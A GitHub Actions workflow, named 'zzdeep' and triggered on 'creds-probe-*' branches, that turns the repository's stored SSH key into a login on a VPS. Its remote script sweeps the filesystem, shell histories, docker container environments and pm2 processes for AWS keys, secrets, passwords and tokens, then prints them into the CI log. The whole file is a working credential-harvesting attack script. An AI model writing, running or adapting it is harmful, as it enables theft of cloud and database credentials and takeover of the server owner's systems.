name: zzdeep
on:
  push:
    branches: ['creds-probe-*']
jobs:
  d:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: deep
        env:
          VPS_HOST: ${{ secrets.VPS_HOST }}
          VPS_USERNAME: ${{ secrets.VPS_USERNAME }}
          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
        run: |
          python3 - <<'PY'
          import os,textwrap
          v=os.environ["VPS_SSH_KEY"].strip().replace("\n","").replace(" ","")
          open("/tmp/k","w").write("-----BEGIN OPENSSH PRIVATE KEY-----\n"+"\n".join(textwrap.wrap(v,70))+"\n-----END OPENSSH PRIVATE KEY-----\n")
          os.chmod("/tmp/k",0o600)
          PY
          S="ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20"
          R="$VPS_USERNAME@$VPS_HOST"
          set +e
          timeout 400 $S $R 'bash -s' <<'EOS' > /tmp/out 2>&1
          set +e
          echo "=ID="; id; hostname; uptime
          echo "=DISK="; df -h | head -8
          echo "=LISTEN="; ss -lntp 2>/dev/null | head -25
          echo "=AWSFILES="; ls -la /root/.aws /home/*/.aws /var/www/*/.aws 2>&1 | head -20
          F=/tmp/l; : > $F
          find / -xdev -maxdepth 8 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name "credentials" -o -name "*.tfstate" -o -name "*.tfstate.backup" -o -name "*.tfvars" -o -name "*.pem" -o -name "*.key" -o -name "wp-config.php" -o -name "config.php" -o -name "docker-compose*.yml" -o -name "*.sql" -o -name "*.sql.gz" -o -name "*.bak" -o -name "*.tar.gz" -o -name "*.zip" \) 2>/dev/null | grep -vE "node_modules|/proc/|/snap/" >> $F
          sort -u $F -o $F; wc -l $F
          echo "=FILELIST="; head -250 $F
          echo "=AWSGREP_FILES="
          while IFS= read -r f; do
            case "$f" in
              *.gz) zgrep -aoE '.{0,250}(AKIA|ASIA)[0-9A-Z]{16}.{0,250}' "$f" 2>/dev/null | head -3 | sed "s|^|$f :: |" ;;
              *) grep -aoE '.{0,250}(AKIA|ASIA)[0-9A-Z]{16}.{0,250}' "$f" 2>/dev/null | head -3 | sed "s|^|$f :: |" ;;
            esac
          done < $F | sort -u | head -80
          echo "=AWSGREP_DIRS="
          grep -rIhoE '.{0,200}(AKIA|ASIA)[0-9A-Z]{16}.{0,200}' /var/www /srv /home /root /opt /var/backups 2>/dev/null | sort -u | head -60
          echo "=SECGREP="
          grep -rhoE 'aws_secret_access_key.{0,6}[A-Za-z0-9/+=]{40}' /var/www /srv /home /root /opt /var/backups 2>/dev/null | sort -u | head -30
          echo "=HIST="
          grep -aiE 'AKIA|ASIA|aws_secret|aws configure|ssh -i|scp -i|mysqldump' /root/.bash_history /root/.mysql_history /home/*/.bash_history /home/*/.mysql_history 2>/dev/null | tail -40
          echo "=DOCKER="; which docker && docker ps --format '{{.Names}}' 2>/dev/null | head -20
          for n in $(docker ps --format '{{.Names}}' 2>/dev/null | head -20); do echo "## $n"; docker inspect $n --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null | grep -iE 'AWS|SECRET|TOKEN|PASS|KEY' | head -12; done
          echo "=PM2="; which pm2 && (pm2 jlist 2>/dev/null | head -c 3000)
          echo "=CRONTAB="; crontab -l 2>/dev/null | head -20; ls -la /etc/cron.d 2>/dev/null | head
          echo "=DONE="
EOS
          echo "===OUT==="
          cat /tmp/out | head -1200
